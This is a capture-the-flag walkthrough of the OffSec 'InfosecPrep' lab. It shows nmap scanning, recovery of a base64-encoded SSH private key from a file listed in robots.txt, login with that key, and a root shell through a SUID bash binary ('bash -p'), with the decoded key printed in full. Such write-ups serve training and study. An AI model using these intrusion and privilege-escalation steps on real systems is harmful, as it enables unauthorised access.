# InfosecPrep

- [Machine information](#machine-information)
- [Solution](#solution)
- [References](#references)

## Machine information

```text
Type: PG Play
Difficulty: Easy
Community Rating: Easy
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
OS: Linux
Points: 5
Lab Description:
This lab involves exploiting a disclosed SSH private key to gain initial access to a user account. 
The privilege escalation phase utilizes misconfigured SUID permissions on /bin/bash, allowing the 
user to escalate to root privileges
Released: 4 Sep 2020
```

Machine link: [https://portal.offsec.com/machine/infosecprep-399/overview/details](https://portal.offsec.com/machine/infosecprep-399/overview/details)

## Solution

### Scan for services with nmap

We start by scanning the machine on all ports with `nmap` including service info and default scripts

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/InfosecPrep]
└─$ export TARGET_IP=192.168.197.89 

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/InfosecPrep]
└─$ sudo nmap -sC -sV -p- $TARGET_IP
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-21 13:55 CET
Nmap scan report for 192.168.197.89
Host is up (0.036s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 91:ba:0d:d4:39:05:e3:13:55:57:8f:1b:46:90:db:e4 (RSA)
|   256 0f:35:d1:a1:31:f2:f6:aa:75:e8:17:01:e7:1e:d1:d5 (ECDSA)
|_  256 af:f1:53:ea:7b:4d:d7:fa:d8:de:0d:f2:28:fc:86:d7 (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/secret.txt
|_http-title: OSCP Voucher &#8211; Just another WordPress site
|_http-generator: WordPress 5.4.2
33060/tcp open  mysqlx  MySQL X protocol listener
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.71 seconds
```

We have three services running:

- OpenSSH 8.2p1 on port 22
- Apache httpd 2.4.41 on port 80
- MySQL on port 33060

### Analyse the web service

Next, we analyse the contents of the web server.

Manually browsing to `http://192.168.197.89/` shows a Wordpress blog

![Web Site on InfosecPrep](Images/Web_Site_on_InfosecPrep.png)

There are two blog posts made by `admin`.

Doing some basic web enumeration with nmap, we find

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/InfosecPrep]
└─$ nmap -v -p80 --script http-enum $TARGET_IP
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-21 13:59 CET
NSE: Loaded 1 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 13:59
Completed NSE at 13:59, 0.00s elapsed
Initiating Ping Scan at 13:59
Scanning 192.168.197.89 [4 ports]
Completed Ping Scan at 13:59, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:59
Completed Parallel DNS resolution of 1 host. at 13:59, 0.06s elapsed
Initiating SYN Stealth Scan at 13:59
Scanning 192.168.197.89 [1 port]
Discovered open port 80/tcp on 192.168.197.89
Completed SYN Stealth Scan at 13:59, 0.06s elapsed (1 total ports)
NSE: Script scanning 192.168.197.89.
Initiating NSE at 13:59
Completed NSE at 13:59, 3.68s elapsed
Nmap scan report for 192.168.197.89
Host is up (0.034s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /wp-login.php: Possible admin folder
|   /robots.txt: Robots file
|   /readme.html: Wordpress version: 2 
|   /: WordPress version: 5.4.2
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|_  /readme.html: Interesting, a readme.

NSE: Script Post-scanning.
Initiating NSE at 13:59
Completed NSE at 13:59, 0.00s elapsed
Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 4.06 seconds
           Raw packets sent: 5 (196B) | Rcvd: 2 (72B)
```

We have a `robots.txt` file

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/InfosecPrep]
└─$ curl http://$TARGET_IP/robots.txt 
User-Agent: *
Disallow: /secret.txt

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/InfosecPrep]
└─$ curl http://$TARGET_IP/secret.txt 
LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFB
QUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFB
d0VBQVFBQUFZRUF0SENzU3pIdFVGOEs4dGlPcUVDUVlMcktLckNSc2J2cTZpSUc3UjlnMFdQdjl3
K2drVVdlCkl6QlNjdmdsTEU5ZmxvbHNLZHhmTVFRYk1WR3FTQURuWUJUYXZhaWdRZWt1ZTBiTHNZ
ay9yWjVGaE9VUlpMVHZkbEpXeHoKYklleUM1YTVGMERsOVVZbXpDaGU0M3owRG8waVF3MTc4R0pV
UWFxc2NMbUVhdHFJaVQvMkZrRitBdmVXM2hxUGZicnc5dgpBOVFBSVVBM2xlZHFyOFhFelkvL0xx
MCtzUWcvcFV1MEtQa1kxOGk2dm5maVlIR2t5VzFTZ3J5UGg1eDlCR1RrM2VSWWNOCnc2bURiQWpY
S0tDSEdNK2RubkdOZ3ZBa3FUK2daV3ovTXB5MGVrYXVrNk5QN05Dek9STnJJWEFZRmExcld6YUV0
eXBId1kKa0NFY2ZXSkpsWjcrZmNFRmE1QjdnRXd0L2FLZEZSWFBRd2luRmxpUU1ZTW1hdThQWmJQ
aUJJcnh0SVlYeTNNSGNLQklzSgowSFNLditIYktXOWtwVEw1T29Ba0I4ZkhGMzB1alZPYjZZVHVj
MXNKS1dSSElaWTNxZTA4STJSWGVFeEZGWXU5b0x1ZzBkCnRIWWRKSEZMN2NXaU52NG1SeUo5UmNy
aFZMMVYzQ2F6TlpLS3dyYVJBQUFGZ0g5SlFMMS9TVUM5QUFBQUIzTnphQzF5YzIKRUFBQUdCQUxS
d3JFc3g3VkJmQ3ZMWWpxaEFrR0M2eWlxd2tiRzc2dW9pQnUwZllORmo3L2NQb0pGRm5pTXdVbkw0
SlN4UApYNWFKYkNuY1h6RUVHekZScWtnQTUyQVUycjJvb0VIcExudEd5N0dKUDYyZVJZVGxFV1Mw
NzNaU1ZzYzJ5SHNndVd1UmRBCjVmVkdKc3dvWHVOODlBNk5Ja01OZS9CaVZFR3FySEM1aEdyYWlJ
ay85aFpCZmdMM2x0NGFqMzI2OFBid1BVQUNGQU41WG4KYXEvRnhNMlAveTZ0UHJFSVA2Vkx0Q2o1
R05mSXVyNTM0bUJ4cE1sdFVvSzhqNGVjZlFSazVOM2tXSERjT3BnMndJMXlpZwpoeGpQblo1eGpZ
THdKS2svb0dWcy96S2N0SHBHcnBPalQrelFzemtUYXlGd0dCV3RhMXMyaExjcVI4R0pBaEhIMWlT
WldlCi9uM0JCV3VRZTRCTUxmMmluUlVWejBNSXB4WllrREdESm1ydkQyV3o0Z1NLOGJTR0Y4dHpC
M0NnU0xDZEIwaXIvaDJ5bHYKWktVeStUcUFKQWZIeHhkOUxvMVRtK21FN25OYkNTbGtSeUdXTjZu
dFBDTmtWM2hNUlJXTHZhQzdvTkhiUjJIU1J4UyszRgpvamIrSmtjaWZVWEs0VlM5VmR3bXN6V1Np
c0sya1FBQUFBTUJBQUVBQUFHQkFMQ3l6ZVp0SkFwYXFHd2I2Y2VXUWt5WFhyCmJqWmlsNDdwa05i
VjcwSldtbnhpeFkzMUtqckRLbGRYZ2t6TEpSb0RmWXAxVnUrc0VUVmxXN3RWY0JtNU1abVFPMWlB
cEQKZ1VNemx2RnFpRE5MRktVSmRUajdmcXlPQVhEZ2t2OFFrc05tRXhLb0JBakduTTl1OHJSQXlq
NVBObzF3QVdLcENMeElZMwpCaGRsbmVOYUFYRFYvY0tHRnZXMWFPTWxHQ2VhSjBEeFNBd0c1Snlz
NEtpNmtKNUVrZldvOGVsc1VXRjMwd1FrVzl5aklQClVGNUZxNnVkSlBubUVXQXB2THQ2MkllVHZG
cWcrdFB0R25WUGxlTzNsdm5DQkJJeGY4dkJrOFd0b0pWSmRKdDNoTzhjNGoKa010WHN2TGdSbHZl
MWJaVVpYNU15bUhhbE4vTEExSXNvQzRZa2cvcE1nM3M5Y1lSUmttK0d4aVVVNWJ2OWV6d000Qm1r
bwpRUHZ5VWN5ZTI4endrTzZ0Z1ZNWng0b3NySW9OOVd0RFVVZGJkbUQyVUJaMm4zQ1pNa09WOVhK
eGVqdTUxa0gxZnM4cTM5ClFYZnhkTmhCYjNZcjJSakNGVUxEeGh3RFNJSHpHN2dmSkVEYVdZY09r
TmtJYUhIZ2FWN2t4enlwWWNxTHJzMFM3QzRRQUEKQU1FQWhkbUQ3UXU1dHJ0QkYzbWdmY2RxcFpP
cTYrdFc2aGttUjBoWk5YNVo2Zm5lZFV4Ly9RWTVzd0tBRXZnTkNLSzhTbQppRlhsWWZnSDZLLzVV
blpuZ0Viak1RTVRkT09sa2JyZ3BNWWloK1pneXZLMUxvT1R5TXZWZ1Q1TE1nakpHc2FRNTM5M00y
CnlVRWlTWGVyN3E5ME42VkhZWERKaFVXWDJWM1FNY0NxcHRTQ1MxYlNxdmttTnZoUVhNQWFBUzhB
SncxOXFYV1hpbTE1U3AKV29xZGpvU1dFSnhLZUZUd1VXN1dPaVlDMkZ2NWRzM2NZT1I4Um9yYm1H
bnpkaVpneFpBQUFBd1FEaE5YS21TMG9WTWREeQozZktaZ1R1d3I4TXk1SHlsNWpyYTZvd2ovNXJK
TVVYNnNqWkVpZ1phOTZFamNldlpKeUdURjJ1Vjc3QVEyUnF3bmJiMkdsCmpkTGtjMFl0OXVicVNp
a2Q1ZjhBa1psWkJzQ0lydnVEUVpDb3haQkd1RDJEVVd6T2dLTWxmeHZGQk5RRitMV0ZndGJyU1AK
T2dCNGloZFBDMSs2RmRTalFKNzdmMWJOR0htbjBhbW9pdUpqbFVPT1BMMWNJUHp0MGh6RVJMajJx
djlEVWVsVE9VcmFuTwpjVVdyUGdyelZHVCtRdmtrakdKRlgrcjh0R1dDQU9RUlVBQUFEQkFNMGNS
aERvd09GeDUwSGtFK0hNSUoyalFJZWZ2d3BtCkJuMkZONmt3NEdMWmlWY3FVVDZhWTY4bmpMaWh0
RHBlZVN6b3BTanlLaDEwYk53UlMwREFJTHNjV2c2eGMvUjh5dWVBZUkKUmN3ODV1ZGtoTlZXcGVy
ZzRPc2lGWk1wd0txY01sdDhpNmxWbW9VQmpSdEJENGc1TVlXUkFOTzBOajlWV01UYlc5UkxpUgpr
dW9SaVNoaDZ1Q2pHQ0NIL1dmd0NvZjllbkNlajRIRWo1RVBqOG5aMGNNTnZvQVJxN1ZuQ05HVFBh
bWNYQnJmSXd4Y1ZUCjhuZksyb0RjNkxmckRtalFBQUFBbHZjMk53UUc5elkzQT0KLS0tLS1FTkQg
T1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/InfosecPrep]
└─$ curl http://$TARGET_IP/secret.txt -o secret.txt
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100   3502 100   3502   0      0  46992      0                              0

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/InfosecPrep]
└─$ base64 -d secret.txt                           
-----BEGIN OPENSSH PRIVATE KEY-----
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
8nfK2oDc6LfrDmjQAAAAlvc2NwQG9zY3A=
-----END OPENSSH PRIVATE KEY-----
```

We have a private SSH key!

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/InfosecPrep]
└─$ base64 -d secret.txt > id_rsa

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/InfosecPrep]
└─$ chmod 600 id_rsa  
```

### Get SSH access

Let's see if we can login as admin with the key

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/InfosecPrep]
└─$ ssh -i id_rsa admin@$TARGET_IP          
The authenticity of host '192.168.197.89 (192.168.197.89)' can't be established.
ED25519 key fingerprint is SHA256:OORLHLygIlTRZ4nXi9nq+WIrJ26fv7tfgvVHm8FaAzE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.197.89' (ED25519) to the list of known hosts.
admin@192.168.197.89: Permission denied (publickey).
```

Nope, probably wrong user!

Going back through the blog posts again we find the answer:

```text
Oh yea! Almost forgot the only user on this box is “oscp”. 
```

Let's try again with `oscp` as the user

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/InfosecPrep]
└─$ ssh -i id_rsa oscp@$TARGET_IP
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 21 Feb 2026 01:12:19 PM UTC

  System load:  0.0                Processes:             211
  Usage of /:   25.3% of 19.56GB   Users logged in:       0
  Memory usage: 59%                IPv4 address for eth0: 192.168.197.89
  Swap usage:   0%


0 updates can be installed immediately.
0 of these updates are security updates.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

-bash-5.0$ id
uid=1000(oscp) gid=1000(oscp) groups=1000(oscp),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
-bash-5.0$ 
```

### Get the user flag

Now we can start looking for the user flag

```bash
-bash-5.0$ ls -la
total 36
drwxr-xr-x 4 oscp oscp 4096 Feb 21 13:12 .
drwxr-xr-x 3 root root 4096 Jul  9  2020 ..
-rw------- 1 oscp oscp    0 Aug 28  2020 .bash_history
-rw-r--r-- 1 oscp oscp  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 oscp oscp 3771 Feb 25  2020 .bashrc
drwx------ 2 oscp oscp 4096 Feb 21 13:12 .cache
-rwxr-xr-x 1 root root   88 Jul  9  2020 ip
-rw-r--r-- 1 oscp oscp   33 Feb 21 12:54 local.txt
-rw-r--r-- 1 oscp oscp  807 Feb 25  2020 .profile
drwxrwxr-x 2 oscp oscp 4096 Jul  9  2020 .ssh
-rw-r--r-- 1 oscp oscp    0 Jul  9  2020 .sudo_as_admin_successful
-bash-5.0$ cat local.txt
d<REDACTED>4
-bash-5.0$ 
```

Nice, so far so good.

### Enumeration for privesc

We now enumerate the system for privilege escalation opportunities.

We start with checking for SUID and GUID binaries

```bash
-bash-5.0$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -ls 2> /dev/null
      130    109 -rwsr-xr-x   1 root     root       110792 Jul 29  2020 /snap/snapd/8790/usr/lib/snapd/snap-confine
      130    109 -rwsr-xr-x   1 root     root       110792 Jun  5  2020 /snap/snapd/8140/usr/lib/snapd/snap-confine
       56     43 -rwsr-xr-x   1 root     root        43088 Mar  5  2020 /snap/core18/1885/bin/mount
       65     63 -rwsr-xr-x   1 root     root        64424 Jun 28  2019 /snap/core18/1885/bin/ping
       81     44 -rwsr-xr-x   1 root     root        44664 Mar 22  2019 /snap/core18/1885/bin/su
       99     27 -rwsr-xr-x   1 root     root        26696 Mar  5  2020 /snap/core18/1885/bin/umount
     1631     34 -rwxr-sr-x   1 root     shadow      34816 Feb 27  2019 /snap/core18/1885/sbin/pam_extrausers_chkpwd
     1660     34 -rwxr-sr-x   1 root     shadow      34816 Feb 27  2019 /snap/core18/1885/sbin/unix_chkpwd
     1693     71 -rwxr-sr-x   1 root     shadow      71816 Mar 22  2019 /snap/core18/1885/usr/bin/chage
     1698     75 -rwsr-xr-x   1 root     root        76496 Mar 22  2019 /snap/core18/1885/usr/bin/chfn
     1700     44 -rwsr-xr-x   1 root     root        44528 Mar 22  2019 /snap/core18/1885/usr/bin/chsh
     1738     23 -rwxr-sr-x   1 root     shadow      22808 Mar 22  2019 /snap/core18/1885/usr/bin/expiry
     1752     75 -rwsr-xr-x   1 root     root        75824 Mar 22  2019 /snap/core18/1885/usr/bin/gpasswd
     1816     40 -rwsr-xr-x   1 root     root        40344 Mar 22  2019 /snap/core18/1885/usr/bin/newgrp
     1828     59 -rwsr-xr-x   1 root     root        59640 Mar 22  2019 /snap/core18/1885/usr/bin/passwd
     1912    355 -rwxr-sr-x   1 root     crontab    362640 Mar  4  2019 /snap/core18/1885/usr/bin/ssh-agent
     1919    146 -rwsr-xr-x   1 root     root       149080 Jan 31  2020 /snap/core18/1885/usr/bin/sudo
     1976     31 -rwxr-sr-x   1 root     tty         30800 Mar  5  2020 /snap/core18/1885/usr/bin/wall
     2006     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 11  2020 /snap/core18/1885/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     2314    427 -rwsr-xr-x   1 root     root              436552 Mar  4  2019 /snap/core18/1885/usr/lib/openssh/ssh-keysign
       55     43 -rwsr-xr-x   1 root     root               43088 Mar  5  2020 /snap/core18/1754/bin/mount
       64     63 -rwsr-xr-x   1 root     root               64424 Jun 28  2019 /snap/core18/1754/bin/ping
       80     44 -rwsr-xr-x   1 root     root               44664 Mar 22  2019 /snap/core18/1754/bin/su
       98     27 -rwsr-xr-x   1 root     root               26696 Mar  5  2020 /snap/core18/1754/bin/umount
     1663     34 -rwxr-sr-x   1 root     shadow             34816 Feb 27  2019 /snap/core18/1754/sbin/pam_extrausers_chkpwd
     1692     34 -rwxr-sr-x   1 root     shadow             34816 Feb 27  2019 /snap/core18/1754/sbin/unix_chkpwd
     1725     71 -rwxr-sr-x   1 root     shadow             71816 Mar 22  2019 /snap/core18/1754/usr/bin/chage
     1730     75 -rwsr-xr-x   1 root     root               76496 Mar 22  2019 /snap/core18/1754/usr/bin/chfn
     1732     44 -rwsr-xr-x   1 root     root               44528 Mar 22  2019 /snap/core18/1754/usr/bin/chsh
     1770     23 -rwxr-sr-x   1 root     shadow             22808 Mar 22  2019 /snap/core18/1754/usr/bin/expiry
     1783     75 -rwsr-xr-x   1 root     root               75824 Mar 22  2019 /snap/core18/1754/usr/bin/gpasswd
     1847     40 -rwsr-xr-x   1 root     root               40344 Mar 22  2019 /snap/core18/1754/usr/bin/newgrp
     1859     59 -rwsr-xr-x   1 root     root               59640 Mar 22  2019 /snap/core18/1754/usr/bin/passwd
     1943    355 -rwxr-sr-x   1 root     crontab           362640 Mar  4  2019 /snap/core18/1754/usr/bin/ssh-agent
     1950    146 -rwsr-xr-x   1 root     root              149080 Jan 31  2020 /snap/core18/1754/usr/bin/sudo
     2007     31 -rwxr-sr-x   1 root     tty                30800 Mar  5  2020 /snap/core18/1754/usr/bin/wall
     2037     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 10  2019 /snap/core18/1754/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     2345    427 -rwsr-xr-x   1 root     root              436552 Mar  4  2019 /snap/core18/1754/usr/lib/openssh/ssh-keysign
   917970     52 -rwsr-xr--   1 root     messagebus         51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   922466    128 -rwsr-xr-x   1 root     root              130152 Jun  5  2020 /usr/lib/snapd/snap-confine
   918861     16 -rwsr-xr-x   1 root     root               14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
   919076     24 -rwsr-xr-x   1 root     root               22840 Aug 16  2019 /usr/lib/policykit-1/polkit-agent-helper-1
  1053104     16 -rwxr-sr-x   1 root     utmp               14648 Sep 30  2019 /usr/lib/x86_64-linux-gnu/utempter/utempter
   935153    464 -rwsr-xr-x   1 root     root              473576 May 29  2020 /usr/lib/openssh/ssh-keysign
   918587     88 -rwsr-xr-x   1 root     root               88464 May 28  2020 /usr/bin/gpasswd
   918075     44 -rwxr-sr-x   1 root     crontab            43720 Feb 13  2020 /usr/bin/crontab
   918689     36 -rwxr-sr-x   1 root     tty                35048 Apr  2  2020 /usr/bin/wall
   918583     84 -rwxr-sr-x   1 root     shadow             84512 May 28  2020 /usr/bin/chage
   935147    344 -rwxr-sr-x   1 root     ssh               350504 May 29  2020 /usr/bin/ssh-agent
   918308     56 -rwsr-xr-x   1 root     root               55528 Apr  2  2020 /usr/bin/mount
   918156     40 -rwsr-xr-x   1 root     root               39144 Mar  7  2020 /usr/bin/fusermount
   918588     68 -rwsr-xr-x   1 root     root               68208 May 28  2020 /usr/bin/passwd
   920186     44 -rwsr-xr-x   1 root     root               44784 May 28  2020 /usr/bin/newgrp
   918859     48 -rwxr-sr-x   1 root     mlocate            47344 Jul 16  2019 /usr/bin/mlocate
   917977     56 -rwsr-sr-x   1 daemon   daemon             55560 Nov 12  2018 /usr/bin/at
   918586     32 -rwxr-sr-x   1 root     shadow             31312 May 28  2020 /usr/bin/expiry
   918578    164 -rwsr-xr-x   1 root     root              166056 Feb  3  2020 /usr/bin/sudo
   918584     84 -rwsr-xr-x   1 root     root               85064 May 28  2020 /usr/bin/chfn
   917983   1156 -rwsr-sr-x   1 root     root             1183448 Feb 25  2020 /usr/bin/bash
   918376     32 -rwsr-xr-x   1 root     root               31032 Aug 16  2019 /usr/bin/pkexec
   918647     40 -rwsr-xr-x   1 root     root               39144 Apr  2  2020 /usr/bin/umount
   918585     52 -rwsr-xr-x   1 root     root               53040 May 28  2020 /usr/bin/chsh
   917990     16 -rwxr-sr-x   1 root     tty                14488 Mar 30  2020 /usr/bin/bsd-write
   918577     68 -rwsr-xr-x   1 root     root               67816 Apr  2  2020 /usr/bin/su
   924770     44 -rwxr-sr-x   1 root     shadow             43168 Dec 17  2019 /usr/sbin/pam_extrausers_chkpwd
   924817     44 -rwxr-sr-x   1 root     shadow             43160 Dec 17  2019 /usr/sbin/unix_chkpwd
-bash-5.0$ 
```

Among the lengthy output we find `/usr/bin/bash`!

### Get a root shell

Next, we get a root shell

```bash
bash-5.0$ bash -p
bash-5.0# id
uid=1000(oscp) gid=1000(oscp) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd),1000(oscp)
bash-5.0# 
```

Note that we need to add the `-p` flag. From the manpage:

> If the shell is started with the effective user (group) id not  
> equal to the real user (group) id, and the -p option is not  
> supplied, no startup files are read, shell functions are not  
> inherited from the environment, the SHELLOPTS, BASHOPTS, CDPATH,  
> and GLOBIGNORE variables, if they appear in the environment, are  
> ignored, and the effective user id is set to the real user id.  If  
> the -p option is supplied at invocation, the startup behavior is  
> the same, but the effective user id is not reset.

### Get the root flag

Finally, we can get the root flag

```bash
bash-5.0# cd /root
bash-5.0# ls -l
total 16
-rwxr-xr-x 1 root root  248 Jul 11  2020 fix-wordpress
-rw-r--r-- 1 root root   32 Aug 28  2020 flag.txt
-rw-r--r-- 1 root root   33 Feb 21 12:54 proof.txt
drwxr-xr-x 3 root root 4096 Jul  9  2020 snap
bash-5.0# cat proof.txt
3<REDACTED>0
bash-5.0# 
```

For additional information, please see the references below.

## References

- [Apache HTTP Server - Wikipedia](https://en.wikipedia.org/wiki/Apache_HTTP_Server)
- [base64 - Linux manual page](https://man7.org/linux/man-pages/man1/base64.1.html)
- [Base64 - Wikipedia](https://en.wikipedia.org/wiki/Base64)
- [bash - Linux manual page](https://www.man7.org/linux/man-pages/man1/bash.1.html)
- [chmod - Linux manual page](https://man7.org/linux/man-pages/man1/chmod.1.html)
- [curl - Homepage](https://curl.se/)
- [curl - Linux manual page](https://man7.org/linux/man-pages/man1/curl.1.html)
- [cURL - Wikipedia](https://en.wikipedia.org/wiki/CURL)
- [id - Linux manual page](https://man7.org/linux/man-pages/man1/id.1.html)
- [nmap - Homepage](https://nmap.org/)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [nmap - Manual page](https://nmap.org/book/man.html)
- [MySQL - Wikipedia](https://en.wikipedia.org/wiki/MySQL)
- [OpenSSH - Wikipedia](https://en.wikipedia.org/wiki/OpenSSH)
- [robots.txt - Wikipedia](https://en.wikipedia.org/wiki/Robots.txt)
- [Secure Shell - Wikipedia](https://en.wikipedia.org/wiki/Secure_Shell)
- [ssh - Linux manual page](https://man7.org/linux/man-pages/man1/ssh.1.html)
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [sudo - Wikipedia](https://en.wikipedia.org/wiki/Sudo)
- [WordPress - Wikipedia](https://en.wikipedia.org/wiki/WordPress)
